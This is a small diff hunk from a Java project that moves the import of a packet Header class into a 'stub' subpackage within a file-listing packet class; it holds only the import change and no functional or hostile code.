@@ -5,7 +5,7 @@ import java.util.Calendar;
 import java.util.Date;
 
 import com.redpois0n.Connection;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.stub.packets.outgoing.Header;
 
 
 public class PacketLISTFILES extends AbstractIncomingPacket {
